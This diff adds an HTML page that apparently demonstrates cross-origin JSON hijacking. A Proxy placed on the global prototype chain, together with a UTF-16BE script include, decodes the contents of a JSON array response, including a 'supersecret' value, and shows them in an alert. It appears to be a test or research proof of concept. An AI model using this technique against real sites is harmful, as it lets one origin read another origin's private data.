@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Document</title>
+  </head>
+  <body>
+    <script>
+      Object.setPrototypeOf(
+        __proto__,
+        new Proxy(__proto__, {
+          has: function(target, name) {
+            alert(
+              name.replace(/./g, function(c) {
+                c = c.charCodeAt(0);
+                return String.fromCharCode(c >> 8, c & 0xff);
+              })
+            );
+          }
+        })
+      );
+    </script>
+    <script
+      charset="UTF-16BE"
+      src="external-script-with-array-literal"
+    ></script>
+    <!-- script contains the following response: ["supersecret","<?php echo chr(0)?>aa"] -->
+  </body>
+</html>
